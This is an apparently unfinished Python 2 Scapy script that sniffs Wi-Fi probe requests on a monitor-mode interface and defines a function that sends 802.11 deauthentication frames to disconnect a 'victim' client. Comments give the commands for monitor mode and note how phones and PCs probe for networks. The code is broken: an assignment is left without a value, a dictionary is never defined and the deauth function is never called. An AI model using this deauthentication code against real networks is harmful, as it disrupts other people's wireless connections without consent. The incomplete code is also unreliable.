#!/usr/bin/env python


#TODO : force usage of sudo


#Scapy lib for packet injection/sniffing
#To put card in monitor mode : 
# 	os.system("ifconfig <interface> down")
# 	os.system("iwconfig <interface> mode monitor")
# 	os.system("ifconfig <interface> up")

from scapy.all import *

#Monitor interface
iface = "wlan1"

#Detected wireless clients and their directed probe target (if not broadcast)
#My Iphone for example broadcast SSID "Swisscom_auto_login"
#Windows PC seems to send directed probe to their registered SSID
observedClients = []

#Try to deauthenticate the victim
def deauth(p):
    sendp(RadioTap()/Dot11(type=0,subtype=12,addr1=p.addr2,addr2=p.addr3,addr3=p.addr3)/Dot11Deauth())


#Process each sniffed packet
def process(p):
    
    #We're only concerned by probe request packets
    #Also, sometime, addr2 is NoneType (don't know why actually)
    if not p.haslayer(Dot11) or p.addr2 is None :
	return
    
    if p.addr2 not in observedClients:
        print p.addr2 + " detected!"
	probes[p.addr2] = 

sniff(iface=iface,prn=process)
    

    
